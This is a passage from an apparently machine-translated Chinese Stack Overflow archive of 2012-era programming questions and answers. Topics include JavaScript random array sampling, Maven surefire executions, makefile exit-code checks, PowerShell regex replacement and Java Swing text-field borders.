`LongListSelectorPOC.dll!LongListSelectorPOC.App.Application_UnhandledException(object sender, System.Windows.ApplicationUnhandledExceptionEventArgs e) Line 102 + 0x5 bytes C# System.Windows.dll!MS.Internal.Error.CallApplicationUEHandler(System.Exception e) + 0x30 bytes
System.Windows.dll!MS.Internal.Error.GetXresultForUserException(System.Exception ex) + 0x4d bytes
System.Windows.dll!MS.Internal.FrameworkCallbacks.ManagedPeerTreeUpdate(System.IntPtr oldParentElement, System.IntPtr parentElement, System.IntPtr childElement, byte bIsParentAlive, byte bKeepReferenceToParent, byte bCanCreateParent) + 0x6b bytes
[External Code] System.Windows.dll!MS.Internal.XcpImports.MeasureOverrideNative(System.IntPtr element, float inWidth, float inHeight, out float outWidth, out float outHeight)
System.Windows.dll!MS.Internal.XcpImports.FrameworkElement_MeasureOverride(System.Windows.FrameworkElement element, System.Windows.Size availableSize) + 0x26 bytes System.Windows.dll!System.Windows.FrameworkElement.MeasureOverride(System.Windows.Size availableSize) + 0x7 bytes
System.Windows.dll!System.Windows.FrameworkElement.MeasureOverride(System.IntPtr nativeTarget, double inWidth, double inHeight, out double outWidth, out double outHeight) + 0x43 bytes [External Code] System.Windows.dll!MS.Internal.XcpImports.Measure_WithDesiredSizeNative(System.IntPtr element, float inWidth, float inHeight, out float outWidth, out float outHeight)
System.Windows.dll!MS.Internal.XcpImports.UIElement_Measure_WithDesiredSize(System.Windows.UIElement element, System.Windows.Size availableSize) + 0x26 bytes
System.Windows.dll!System.Windows.UIElement.Measure_WithDesiredSize(System.Windows.Size availableSize) + 0x39 bytes System.Windows.dll!System.Windows.Controls.VirtualizingStackPanel.MeasureChild(System.Windows.UIElement child, System.Windows.Size layoutSlotSize) + 0x42 bytes System.Windows.dll!System.Windows.Controls.VirtualizingStackPanel.GeneratePreviousChild(int childIndex, System.Windows.Size layoutSlotSize) + 0x6f bytes
System.Windows.dll!System.Windows.Controls.VirtualizingStackPanel.GeneratePreviousItems(ref double logicalVisibleSpace, ref System.Windows.Size stackDesiredSize, System.Windows.Size layoutSlotSize, bool isHorizontal, bool adjustPositions) + 0x138 bytes
System.Windows.dll!System.Windows.Controls.VirtualizingStackPanel.MeasureOverride(System.Windows.Size constraint) + 0x4e1 bytes System.Windows.dll!System.Windows.FrameworkElement.MeasureOverride(System.IntPtr nativeTarget, double inWidth, double inHeight, out double outWidth, out double outHeight) + 0x43 bytes [External Code]`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T10:22:02.130

用于. `ObservableCollection`_`ItemContent`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T07:55:56.437

你应该使用`DataTemplateSelector`方法。

例如，使用字段定义枚举 ItemType ，`Grid`然后在类中使用该枚举选择模板。`Border``StackPanel``DataTemplateSelector`

对于`DataTemplateSelector`，请查看以下文章： http: [//www.windowsphonegeek.com/articles/Implementing-Windows-Phone-7-DataTemplateSelector-and-CustomDataTemplateSelector](http://www.windowsphonegeek.com/articles/Implementing-Windows-Phone-7-DataTemplateSelector-and-CustomDataTemplateSelector)

# google-maps - 使用 Google Maps My Location 获取路线

> ID：11935168
> 
> 赞同：0
> 
> 时间：2012-08-13T13:25:05.870
> 
> 标签：google-maps

我想使用 Google Maps MyLocation 集成一个简单的“到我的商店的路线”，以便通过移动浏览器进行分发。

完美的解决方案（从最终用户的角度来看）是 - 从用户 GEO-Location 到预先配置的 POI（我的商店）的绘制路线。就是这样。我想避免出现“获取路线”对话框（它在移动设备上看起来很软）。只是一张带有起点、终点和中间路线的地图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-13T00:34:18.940

我不确定这是否满足您避免“获取路线”对话框的目标，因为它肯定会涉及用户的中间步骤。但对话框在移动设备上不会“看起来很软”；事实上，它将针对移动观看进行优化。

如果您仅将 daddr（目的地地址）坐标插入到地图调用中，使用商店（或任何位置）的纬度和经度，Google 地图将尝试将起始位置默认设置为用户的“我的位置”位置如果设备支持，否则会提示用户输入起始位置。它还将允许用户选择所需的支持的交通方式（步行、自行车、公交或汽车）。

此示例绘制了从您所在位置到亚特兰大小马丁路德金出生地的路线： [https ://maps.google.com/maps?daddr=33.755418,-84.371100](https://maps.google.com/maps?daddr=33.755418,-84.371100)

我在以下设备上成功测试了这个：

*   使用 Chrome 的 Windows 7 桌面；
*   使用 Firefox 的 Windows 7 桌面；
*   使用 Internet Explorer 的 Windows 7 桌面；
*   带有 Jelly Bean OS 的 Android 手机，使用已安装的 Google Maps 应用程序；
*   带有果冻豆操作系统的安卓手机，使用默认浏览器；
*   带有 Jelly Bean OS 的 Android 手机，使用 Chrome；
*   iPhone 与 iOS6 使用默认浏览器。

基于我在这些测试中得到的响应的一致性，我相信它可以在大多数（如果不是全部）场景中工作。

# c# - 在可移植类中实现基于事件的异步模式

> ID：11935170
> 
> 赞同：3
> 
> 时间：2012-08-13T13:25:06.893
> 
> 标签：c#, .net, windows-8, portable-class-library

我有一些在应用程序之间共享的 c# 类库。我想创建一个 Windows 8 Style App，但它只支持 windows 8 类库或[可移植类库](http://msdn.microsoft.com/en-us/library/gg597391.aspx)。决定使用后者，除了异步操作之外，我已经毫无困难地移植了所有内容。

目前我的类库正在实现[基于事件的异步模式](http://msdn.microsoft.com/en-us/library/8wy069k1.aspx)。

从这个例子中，一个可移植库似乎不支持`System.Componenent.AsyncOperation/AsyncOperationManager`和`System.Collections.Specialized.HybridDictionary`.

我的两个问题是：

1）什么是一个好的集合来代替`HybridDictionary`？

2）我怎样才能绕过缺乏`AsyncOperation/AsyncOperationManager`？我需要实现完全不同的模式吗？

更新：在 VS 2012 中，我的便携式类库的目标是“.net framework 4 及更高版本”、“Silverlight 4 及更高版本”、“windows phone 7 及更高版本”、“.net for Metro 风格应用程序”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T07:13:03.663

1) 你在 HybridDictionary 中使用了多少个元素？如果低于 10)，只需使用 List<T>。否则，使用 Dictionary<Key, TValue>。

2) 我在[http://pclcontrib.codeplex.com/](http://pclcontrib.codeplex.com/)上有一个便携式版本的 AsyncOperation/AsyncOperationManager 和 BackgroundWorker 。目前还没有二进制文件，只需浏览 Portable.ComponentModel.Async 项目以获取源代码。

# http - RequestBuilder 和 http 授权标头

> ID：11935171
> 
> 赞同：0
> 
> 时间：2012-08-13T13:25:07.847
> 
> 标签：http, gwt

GWT RequestBuider 对象如何生成 Authorization 标头？它使用用户名和密码吗？或者它不生成，我必须计算它？如果是这样，我该如何计算基本授权？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T21:34:31.797

RequestBuilder 在底层使用 XMLHttpRequest，它依赖于浏览器进行身份验证。对于基本身份验证，您所要做的就是提供用户和密码。请注意，您无法控制身份验证错误，如果凭据错误，浏览器将使用自己的 UI 询问用户。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-09T14:12:18.113

必须设置“授权”标头。服务器仅在提示授权时才使用用户名和密码。

# javascript - 从数组中采样一个随机子集

> ID：11935175
> 
> 赞同：32
> 
> 时间：2012-08-13T13:25:29.847
> 
> 标签：javascript, arrays, random, numerical-methods

什么是一种随机抽样的干净方法，而不是从 javascript 中的数组中替换？所以假设有一个数组

```
x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15] 
```

我想随机抽取 5 个唯一值；即生成长度为 5 的随机子集。要生成一个随机样本，可以执行以下操作：

```
x[Math.floor(Math.random()*x.length)]; 
```

但是，如果多次执行此操作，则存在多次获取相同条目的风险。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-08-13T13:30:07.827

[我建议使用Fisher-Yates shuffle](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)对数组的副本进行洗牌并切片：

```
function getRandomSubarray(arr, size) {
    var shuffled = arr.slice(0), i = arr.length, temp, index;
    while (i--) {
        index = Math.floor((i + 1) * Math.random());
        temp = shuffled[index];
        shuffled[index] = shuffled[i];
        shuffled[i] = temp;
    }
    return shuffled.slice(0, size);
}

var x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
var fiveRandomMembers = getRandomSubarray(x, 5); 
```

请注意，这不是获取大数组的小随机子集的最有效方法，因为它会不必要地对整个数组进行混洗。为了获得更好的性能，您可以改为进行部分洗牌：

```
function getRandomSubarray(arr, size) {
    var shuffled = arr.slice(0), i = arr.length, min = i - size, temp, index;
    while (i-- > min) {
        index = Math.floor((i + 1) * Math.random());
        temp = shuffled[index];
        shuffled[index] = shuffled[i];
        shuffled[i] = temp;
    }
    return shuffled.slice(min);
} 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-10-28T09:27:49.387

聚会有点晚了，但这可以通过下划线的新[示例](http://underscorejs.org/#sample) 方法解决（下划线 1.5.2 - 2013 年 9 月）：

```
var x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];

var randomFiveNumbers = _.sample(x, 5); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-06-15T12:37:20.297

在我看来，我认为没有必要洗牌整个牌组。您只需要确保您的样本是随机的，而不是您的套牌。您可以做的是`size`从前面选择数量，然后将采样数组中的每个位置与其中的另一个位置交换。所以，如果你允许替换，你会变得越来越混乱。

```
function getRandom(length) { return Math.floor(Math.random()*(length)); }

function getRandomSample(array, size) {
    var length = array.length;

    for(var i = size; i--;) {
        var index = getRandom(length);
        var temp = array[index];
        array[index] = array[i];
        array[i] = temp;
    }

    return array.slice(0, size);
} 
```

`2*size`如果包含该方法，该算法只是`slice`选择随机样本的步骤。

* * *

## 更随机

为了使样本更加随机，我们可以随机选择样本的起点。但是获取样品要贵一些。

```
function getRandomSample(array, size) {
    var length = array.length, start = getRandom(length);

    for(var i = size; i--;) {
        var index = (start + i)%length, rindex = getRandom(length);
        var temp = array[rindex];
        array[rindex] = array[index];
        array[index] = temp;
    }
    var end = start + size, sample = array.slice(start, end);
    if(end > length)
        sample = sample.concat(array.slice(0, end - length));
    return sample;
} 
```

使这更加随机的事实是，当您总是对前面的项目进行洗牌时，如果采样数组很大而样本很小，您往往不会经常在样本中得到它们。如果数组不应该始终相同，这将不是问题。所以，这个方法所做的就是改变洗牌区域开始的这个位置。

* * *

## 无更换

为了不必复制采样数组并且不用担心替换，您可以执行以下操作，但它确实为您提供`3*size`了与`2*size`.

```
function getRandomSample(array, size) {
    var length = array.length, swaps = [], i = size, temp;

    while(i--) {
        var rindex = getRandom(length);
        temp = array[rindex];
        array[rindex] = array[i];
        array[i] = temp;
        swaps.push({ from: i, to: rindex });
    }

    var sample = array.slice(0, size);

    // Put everything back.
    i = size;
    while(i--) {
         var pop = swaps.pop();
         temp = array[pop.from];
         array[pop.from] = array[pop.to];
         array[pop.to] = temp;
    }

    return sample;
} 
```

* * *

## 无需更换，更随机

将提供更多随机样本的算法应用于无替换函数：

```
function getRandomSample(array, size) {
    var length = array.length, start = getRandom(length),
        swaps = [], i = size, temp;

    while(i--) {
        var index = (start + i)%length, rindex = getRandom(length);
        temp = array[rindex];
        array[rindex] = array[index];
        array[index] = temp;
        swaps.push({ from: index, to: rindex });
    }

    var end = start + size, sample = array.slice(start, end);
    if(end > length)
        sample = sample.concat(array.slice(0, end - length));

    // Put everything back.
    i = size;
    while(i--) {
         var pop = swaps.pop();
         temp = array[pop.from];
         array[pop.from] = array[pop.to];
         array[pop.to] = temp;
    }

    return sample;
} 
```

* * *

## 快点...

像所有这些帖子一样，这使用了 Fisher-Yates Shuffle。但是，我删除了复制数组的开销。

```
function getRandomSample(array, size) {
    var r, i = array.length, end = i - size, temp, swaps = getRandomSample.swaps;

    while (i-- > end) {
        r = getRandom(i + 1);
        temp = array[r];
        array[r] = array[i];
        array[i] = temp;
        swaps.push(i);
        swaps.push(r);
    }

    var sample = array.slice(end);

    while(size--) {
        i = swaps.pop();
        r = swaps.pop();
        temp = array[i];
        array[i] = array[r];
        array[r] = temp;
    }

    return sample;
}
getRandomSample.swaps = []; 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-08-13T14:26:05.693

或者...如果您使用 underscore.js...

```
_und = require('underscore');

...

function sample(a, n) {
    return _und.take(_und.shuffle(a), n);
} 
```

很简单。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2015-01-11T12:41:53.680

[虽然我强烈支持按照Tim Down 的建议](https://stackoverflow.com/a/11935263/3873012)使用 Fisher-Yates Shuffle，但这是一种非常简短的方法，可以根据要求实现随机子集，在数学上是正确的，包括空集和给定集本身。

注意解决方案取决于[lodash](http://devdocs.io/lodash/index#sample) / [underscore](http://underscorejs.org/#sample)：

### 洛达什 v4

```
const _ = require('loadsh')

function subset(arr) {
    return _.sampleSize(arr, _.random(arr.length))
} 
```

### 洛达什 v3

```
const _ = require('loadsh')

function subset(arr) {
    return _.sample(arr, _.random(arr.length));
} 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2018-09-08T07:12:25.967

您可以通过这种方式获得 5 个元素的样本：

```
var sample = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
.map(a => [a,Math.random()])
.sort((a,b) => {return a[1] < b[1] ? -1 : 1;})
.slice(0,5)
.map(a => a[0]); 
```

您可以将其定义为要在代码中使用的函数：

```
var randomSample = function(arr,num){ return arr.map(a => [a,Math.random()]).sort((a,b) => {return a[1] < b[1] ? -1 : 1;}).slice(0,num).map(a => a[0]); } 
```

或者将其添加到 Array 对象本身：

```
 Array.prototype.sample = function(num){ return this.map(a => [a,Math.random()]).sort((a,b) => {return a[1] < b[1] ? -1 : 1;}).slice(0,num).map(a => a[0]); }; 
```

如果需要，您可以将代码分开以获得 2 个功能（Shuffle 和 Sample）：

```
 Array.prototype.shuffle = function(){ return this.map(a => [a,Math.random()]).sort((a,b) => {return a[1] < b[1] ? -1 : 1;}).map(a => a[0]); };
    Array.prototype.sample = function(num){ return this.shuffle().slice(0,num); }; 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-06-15T11:31:12.980

这是另一个基于 Fisher-Yates Shuffle 的实现。但是这个针对样本大小明显小于数组长度的情况进行了优化。此实现不会扫描整个数组，也不会分配与原始数组一样大的数组。它使用稀疏数组来减少内存分配。

```
function getRandomSample(array, count) {
    var indices = [];
    var result = new Array(count);
    for (let i = 0; i < count; i++ ) {
        let j = Math.floor(Math.random() * (array.length - i) + i);
        result[i] = array[indices[j] === undefined ? j : indices[j]];
        indices[j] = indices[i] === undefined ? i : indices[i];
    }
    return result;
} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-08-27T21:02:38.497

如果您使用 lodash，则 API 在 4.x 中已更改：

```
const oneItem = _.sample(arr);
const nItems = _.sampleSize(arr, n); 
```

[https://lodash.com/docs#sampleSize](https://lodash.com/docs#sampleSize)

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2019-01-12T14:32:20.460

也许我遗漏了一些东西，但似乎有一个解决方案不需要洗牌的复杂性或潜在的开销：

```
function sample(array,size) {
  const results = [],
    sampled = {};
  while(results.length<size && results.length<array.length) {
    const index = Math.trunc(Math.random() * array.length);
    if(!sampled[index]) {
      results.push(array[index]);
      sampled[index] = true;
    }
  }
  return results;
} 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2020-10-23T16:36:20.677

很多这些答案都在谈论克隆、改组、切片原始数组。我很好奇为什么从熵/分布的角度来看这会有所帮助。

我不是专家，但我确实使用索引编写了一个示例函数来避免任何数组突变——尽管它确实添加到了 Set 中。我也不知道这是如何随机分布的，但是代码很简单，我认为在这里可以得到答案。

```
function sample(array, size = 1) {
  const { floor, random } = Math;
  let sampleSet = new Set();
  for (let i = 0; i < size; i++) {
    let index;
    do { index = floor(random() * array.length); }
    while (sampleSet.has(index));
    sampleSet.add(index);
  }
  return [...sampleSet].map(i => array[i]);
}

const words = [
  'confused', 'astonishing', 'mint', 'engine', 'team', 'cowardly', 'cooperative',
  'repair', 'unwritten', 'detailed', 'fortunate', 'value', 'dogs', 'air', 'found',
  'crooked', 'useless', 'treatment', 'surprise', 'hill', 'finger', 'pet',
  'adjustment', 'alleged', 'income'
];

console.log(sample(words, 4));
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2012-08-13T13:41:01.080

您可以在选择元素时从数组的副本中删除元素。性能可能并不理想，但它可能满足您的需要：

```
function getRandom(arr, size) {
  var copy = arr.slice(0), rand = [];
  for (var i = 0; i < size && i < copy.length; i++) {
    var index = Math.floor(Math.random() * copy.length);
    rand.push(copy.splice(index, 1)[0]);
  }
  return rand;
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-07-23T19:08:28.890

对于非常大的数组，使用索引而不是数组成员更有效。

这就是我在此页面上没有找到我喜欢的任何内容后最终得到的结果。

```
/**
 * Get a random subset of an array
 * @param {Array} arr - Array to take a smaple of.
 * @param {Number} sample_size - Size of sample to pull.
 * @param {Boolean} return_indexes - If true, return indexes rather than members
 * @returns {Array|Boolean} - An array containing random a subset of the members or indexes.
 */
function getArraySample(arr, sample_size, return_indexes = false) {
    if(sample_size > arr.length) return false;
    const sample_idxs = [];
    const randomIndex = () => Math.floor(Math.random() * arr.length);
    while(sample_size > sample_idxs.length){
        let idx = randomIndex();
        while(sample_idxs.includes(idx)) idx = randomIndex();
        sample_idxs.push(idx);
    }
    sample_idxs.sort((a, b) => a > b ? 1 : -1);
    if(return_indexes) return sample_idxs;
    return sample_idxs.map(i => arr[i]);
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-09-17T23:42:40.697

我的方法是创建一个`getRandomIndexes`方法，您可以使用该方法创建一个索引数组，您将从主数组中提取这些索引。在这种情况下，我添加了一个简单的逻辑来避免示例中的相同索引。这就是它的工作原理

```
const getRandomIndexes = (length, size) => {
  const indexes = [];
  const created = {};

  while (indexes.length < size) {
    const random = Math.floor(Math.random() * length);
    if (!created[random]) {
      indexes.push(random);
      created[random] = true;
    }
  }
  return indexes;
}; 
```

此函数独立于您所拥有的任何内容，将为您提供一个索引数组，您可以使用这些索引从您的长度数组中提取值`length`，因此可以通过以下方式进行采样

```
const myArray = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j']

getRandomIndexes(myArray.length, 3).map(i => myArray[i]) 
```

每次调用该方法时，您都会得到不同的`myArray`. 在这一点上，这个解决方案很酷，但可以更好地采样不同的尺寸。如果你想这样做，你可以使用

```
getRandomIndexes(myArray.length, Math.ceil(Math.random() * 6)).map(i => myArray[i]) 
```

每次调用它都会给你一个从 1-6 不同的样本大小。

我希望这有帮助：D

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2022-01-11T16:57:36.717

`D3-array`的[shuffle](https://observablehq.com/@d3/d3-shuffle)使用 Fisher-Yeates shuffle 算法对数组进行随机重新排序。这是一个变异函数——意味着原始数组被重新排序，这有利于性能。

D3 用于浏览器 - 与节点一起使用更复杂。

[https://github.com/d3/d3-array#shuffle](https://github.com/d3/d3-array#shuffle)

```
npm install d3-array 
```

```
 //import {shuffle} from "d3-array" 

    let x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];

    d3.shuffle(x)

    console.log(x) // it is shuffled
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/5.0.0/d3.min.js"></script>
```

如果您不想改变原始数组

```
 let x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];

    let shuffled_x = d3.shuffle(x.slice()) //calling slice with no parameters returns a copy of the original array

    console.log(x) // not shuffled
    console.log(shuffled_x) 
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/5.0.0/d3.min.js"></script>
```

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2021-09-18T12:11:18.850

[Underscore.js](https://underscorejs.org/)大约 70kb。如果你不需要所有额外的废话，[rando.js](https://github.com/nastyox/Rando.js)只有大约 2kb（小 97%），它的工作方式如下：

```
console.log(randoSequence([8, 6, 7, 5, 3, 0, 9]).slice(-5));
```

```
<script src="https://randojs.com/2.0.0.js"></script>
```

您可以看到默认情况下它会跟踪原始索引，以防两个值相同但您仍然关心选择了哪一个。如果您不需要这些，您可以添加一个地图，如下所示：

```
console.log(randoSequence([8, 6, 7, 5, 3, 0, 9]).slice(-5).map((i) => i.value));
```

```
<script src="https://randojs.com/2.0.0.js"></script>
```

# zk - ZK 中的排序事件

> ID：11935179
> 
> 赞同：0
> 
> 时间：2012-08-13T13:25:42.933
> 
> 标签：zk

我添加了按 asc、desc 顺序排序的比较器。

```
listHeader.setSortAscending(new MyComparator(true)); //True for asc
listHeader.setSortDescending(new MyComparator(false)); //False for asc 
```

当我这样做时。`Events.postEvent(Events.ON_SORT,listHeader,null);` 我让列表框按升序排序，但是我希望在上面调用时按降序排序我`Events.postEvent();`是否缺少设置任何属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T06:21:04.470

找到答案:) 我必须将属性排序方向设置为“升序”`listHeader.setSortDirection("ascending");`

# python - 如果python脚本输出OK，如何签入makefile

> ID：11935180
> 
> 赞同：0
> 
> 时间：2012-08-13T13:25:42.530
> 
> 标签：python, makefile

我有一个 Python 脚本，它检查我的语言翻译文件（CSV 格式），如果所有行都包含 CSV 第一个标题行中包含的所有语言的翻译。脚本列出了缺少翻译的文件/行。如果没有发现问题，则输出 OK。 **我的问题如下：** 如何从 makefile 中调用脚本并检查输出是否正常？如果脚本打印的不是 OK，我希望 makefile 停止。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:28:01.703

`make`检查输出状态，而不是输出的文本。最简单的解决方案是`sys.exit(1)`在您的 python 脚本中使用，如果它没有检查出 OK。

例如：

```
targetfile: dependsonfile
      python pythonscript.py -o targetfile dependsonfile 
```

当然，实际的语法将严重依赖于如何`pythonscript.py`被调用。

如果您的 pythonscript 只是进行检查，您可以按如下方式完成：

```
makethis: didcheck
    echo "made it" > makethis   

didcheck:  #dependencies here
    python -c 'import sys; sys.exit(1)'
    touch didcheck 
```

然后你调用 make as `make makethis`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T19:34:19.467

如果修改 Python 脚本以使其使用退出代码指示其结果是不可能的，您可以在 Make 中实现它，如下所示（假设您在 *nix 上工作）：

```
check-i18n:
    @if [ `python your_script.py` = 'OK' ]; \
        then echo "good enough"; \
        else echo "too bad"; exit 1; \
    fi 
```

另一个选项，可读性较差，但跨平台（因此它也适用于 Windows）：

```
# String equality check.
eq = $(findstring $1,$(findstring $2,$1))

check-i18n:
    @$(if $(call eq,OK,$(shell python your_script.py)), \
        echo "good enough", \
        echo "too bad"; exit 1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:30:44.130

作为我对[这个问题的回答](https://stackoverflow.com/questions/11920725/python-can-i-know-if-a-printing-occurred-or-not/11920772#11920772)

```
import os
import copy
import subprocess

def command(command):
    env = copy.deepcopy(os.environ)
    proc = subprocess.Popen(command,
                shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = proc.stdout.read()
    return result

ret = command(YOUR COMMAND HERE)

if ret == "OK":
    print "yay"
else:
    print "oh no!: %s" % ret 
```

如果你展示了你的代码，我可以更好地实现我的答案。

# maven-3 - maven-surefire 插件中的“default-test”代表什么

> ID：11935181
> 
> 赞同：15
> 
> 时间：2012-08-13T13:25:43.027
> 
> 标签：maven-3, testng, maven-surefire-plugin

我在我的 pom 中定义了以下配置，以确保使用 TestNg：

```
<plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>2.12</version>
            <configuration>
                <skipTests>${skip-all-tests}</skipTests>
            </configuration>
            <executions>
                <execution>
                    <id>unit-tests</id>
                    <phase>test</phase>
                    <goals>
                        <goal>test</goal>
                    </goals>
                    <configuration>
                        <skip>${skip-unit-tests}</skip>
                        <groups>unit</groups>

                        <excludedGroups>integration</excludedGroups>
                    </configuration>
                </execution>
                <execution>
                    <id>integration-tests</id>
                    <phase>integration-test</phase>
                    <goals>
                        <goal>test</goal>
                    </goals>
                    <configuration>
                        <skip>${skip-integration-tests}</skip>
                        <groups>integration</groups>
                        <excludedGroups>unit</excludedGroups>
                    </configuration>
                </execution>
            </executions>
        </plugin> 
```

但似乎这两次执行之前总是有一个“默认测试”运行，它似乎运行每个 @test 注释方法（至少我是这么认为的）。

```
--- maven-surefire-plugin:2.12:test (default-test) @ my-project 
```

例如在项目上运行“mvn test”，会执行两次测试。“默认测试”和“单元测试”。

有人可以向我解释一下吗？可以禁用或控制它（配置测试的内容和不测试的内容）吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-14T08:27:13.623

人们希望有一种方法来覆盖 Maven 中插件的默认内置执行。

Maven 3（或者它可能早在 2.1.0 或 2.2.0 中就已经引入）通过为包装生命周期添加到有效 pom 的每个插件执行定义一个默认执行 ID 来解决这个问题。

这个隐式 id 的名称总是`default-_____`我不记得生成它的确切规则。

因此，您可以通过定义匹配的执行来覆盖打包的注入执行。

为了解决您的问题，我将更`<id>unit-tests</id>`改为`<id>default-test</id>`或添加

```
 <execution>
                <id>default-test</id>
                <configuration>
                    <skip>true</skip>
                </configuration>
            </execution> 
```

两者都具有相同的效果，尽管 `<id>unit-tests</id>`to`<id>default-test</id>` 解决方案的性能会稍高一些，因为您只需要调用两次surefire 执行。

我要指出的另一件事是，使用 maven-failsafe-plugin 执行集成测试可能会更好，因为在某个时间点，您可能想要在集成测试前后做一些事情，而故障安全就是为此而设计的用例（尽管进一步向下切换应该是微不足道的）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2019-06-27T12:21:12.637

除了斯蒂芬的解决方案，如果您不希望在日志中显示以下消息（实际上这有点误导，因为您没有跳过测试）：

```
[INFO] --- maven-surefire-plugin:2.22.2:test (default-test) @ service-template ---
[INFO] Tests are skipped. 
```

...然后走这条路：

```
 <execution>
                    <id>default-test</id>
                    <phase>none</phase>
                </execution> 
```

# box-api - 如何部署我的 box.net 应用程序

> ID：11935184
> 
> 赞同：0
> 
> 时间：2012-08-13T13:25:50.903
> 
> 标签：box-api

我根据文档创建了一个 box.net 应用程序。现在，我想与我的大学分享申请。有谁知道，我怎么能做到？重要的是，我不想公开部署它。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:34:51.027

这实际上取决于您创建的应用程序类型。Box“App Marketplace”中基本上有两种类型的应用程序

1) 在您拥有的 URL 的服务器上运行的应用程序。Box 会向您发送呼叫，用于文件操作（想想右键单击、打开方式）或用于 webhook。

2) 为特定设备（如 iPhone 或 Android）构建的应用程序。它们出现在我们的市场中，但下载链接会将用户带到 iTunes 或 Android 商店以下载该应用程序。这些应用程序通过 API 调用 Box（请参阅[https://developers.box.com/docs](https://developers.box.com/docs)）

如果您已经构建了#1，那么您需要弄清楚您想在哪里托管您编写的软件。Box 可以轻松地将其托管在 Heroku、CloudFoundry 或 Parse 上，因此您可以快速上手，而无需配置自己的硬件等。

所以，这真的取决于你构建了什么样的应用程序。

# regex - PowerShell 中的正则表达式

> ID：11935186
> 
> 赞同：0
> 
> 时间：2012-08-13T13:26:02.710
> 
> 标签：regex, powershell

我需要从出现在两个值之间的文本文件中检索一个字符串。例如，我需要检索之间的字符串`< postcode >W12 FGS < /postcode >` ，然后在该字符串中放置一个空格，所以它看起来像`< postcode >W12 FGS < /postcode >`. 该文件可以包含 100 多个邮政编码。我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:19:57.490

无论如何，根据您的要求，您在处理正则表达式时需要非常精确：

```
$pattern = [regex]::escape('< postcode >W12FGS < /postcode >')
$replaceWith = '< postcode >W12 FGS < /postcode >'

(Get-Content .\postcode.txt) | 
Foreach-Object {$_ -replace $pattern,$replaceWith } |
Set-Content .\postcode.txt 
```

根据评论更新，更改文件夹中多个 xml 的邮政编码。

```
Get-ChildItem c:\postcodes -Filter *.xml | Foreach-Object{
    [xml]$xml = Get-Content $_.FullName
    $xml.SelectNodes('//c_postcode') | Foreach-Object{ $_.'#text' = $_.'#text'.Insert(3,' ') }
    $xml.Save($_.FullName) 
} 
```

# java - 有没有办法让 jtextfield 的一侧（即右边界线）着色

> ID：11935188
> 
> 赞同：7
> 
> 时间：2012-08-13T13:26:06.313
> 
> 标签：java, swing, border, jtextfield

嗨，我准备了一个摆动框架，其中放置了两个文本字段。有没有办法让 jtextfield 的一侧（即右边界线）着色？请建议。我检查了很多东西，但我找不到。提前谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T13:33:36.140

在下面的示例中，我添加了 5 个像素的左侧边框：

```
JTextField jtf = new JTextField();        
jtf.setBorder(BorderFactory.createMatteBorder(0, 5, 0, 0, Color.BLACK)); 
```

这是右侧边框：

```
jtf.setBorder(BorderFactory.createMatteBorder(0, 0, 0, 5, Color.BLACK)); 
```

我希望这就是你所追求的

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-13T13:38:43.423

我会在文本字段中添加一个边框，类似于：

```
Border oldBorder = jTextField.getBorder();
Border redBorder = BorderFactory.createMatteBorder(0, 0, 0, 5, Color.RED);
Border newBorder = BorderFactory.createCompoundBorder(redBorder, oldBorder);
jTextField.setBorder(newBorder); 
```

这种方法保留旧边框并将其包裹在红色（部分）边框内。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-13T13:32:04.630

您可以`CustomBorder`通过从类扩展`Border`并为组件创建自己的自定义边框来创建自己的类。通过调用`setBorder()`您`Component`的实例来设置它，例如：

```
class MyBorder implements Border {

    @Override
    public void paintBorder(Component cmpnt, Graphics grphcs, int x, int y, int width, int height) {
        //draw your border here
    }

    @Override
    public Insets getBorderInsets(Component cmpnt) {
        throw new UnsupportedOperationException("Not supported yet.");
    }

    @Override
    public boolean isBorderOpaque() {
